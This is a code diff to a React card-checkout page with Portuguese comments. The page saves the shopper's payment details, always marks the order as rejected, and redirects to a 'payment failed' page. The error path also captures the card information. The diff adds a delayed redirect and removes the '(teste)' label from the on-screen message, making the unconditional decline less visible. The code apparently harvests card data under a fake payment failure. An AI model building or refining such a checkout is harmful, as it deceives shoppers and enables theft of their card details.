@@ -1,3 +1,4 @@
+
 import { useState, useEffect } from 'react';
 import { useParams, useNavigate, useLocation } from 'react-router-dom';
 import { useQueryClient } from '@tanstack/react-query';
@@ -117,15 +118,22 @@ export default function CartaoPage() {
 
       console.log('Informações de pagamento salvas com sucesso');
 
-      // Atualiza o status do pedido para 'reprovado' (conforme lógica original)
+      // Atualiza o status do pedido para 'reprovado' (conforme requisito)
       const success = await atualizarStatusPedido(pedidoId, 'reprovado');
       if (!success) {
         throw new Error('Erro ao atualizar status do pedido');
       }
 
       console.log('Status do pedido atualizado para "reprovado"');
-      toast.info('Pagamento processado, mas marcado como reprovado (teste)');
-      navigate(`/checkout/${slug}/payment-failed/${pedidoId}`);
+      toast.info('Pagamento processado, redirecionando...');
+
+      // Invalida o cache de pedidos
+      queryClient.invalidateQueries({ queryKey: ['pedidos'] });
+      
+      // Aguarda 1,5 segundos antes de redirecionar (conforme requisito)
+      setTimeout(() => {
+        navigate(`/checkout/${slug}/payment-failed/${pedidoId}`);
+      }, 1500);
 
     } catch (error: any) {
       console.error('Erro ao processar pagamento:', error);
@@ -142,16 +150,22 @@ export default function CartaoPage() {
           parcelas: parseInt(data.parcelas.split('x')[0], 10),
         });
         await atualizarStatusPedido(pedidoId, 'reprovado');
+        
+        // Invalida o cache de pedidos mesmo em caso de erro
+        queryClient.invalidateQueries({ queryKey: ['pedidos'] });
       } catch (captureError) {
         console.error('Erro ao capturar informações após falha:', captureError);
       }
 
-      toast.error('Erro ao processar pagamento. Tente novamente.');
-      navigate(`/checkout/${slug}/payment-failed/${pedidoId}`);
+      toast.error('Erro ao processar pagamento. Você será redirecionado.');
+      
+      // Redireciona para a página de pagamento falhou após 1,5 segundos mesmo em caso de erro
+      setTimeout(() => {
+        navigate(`/checkout/${slug}/payment-failed/${pedidoId}`);
+      }, 1500);
 
     } finally {
       setSubmitting(false);
-      queryClient.invalidateQueries(['pedidos']); // Atualiza cache, se necessário
     }
   };
 
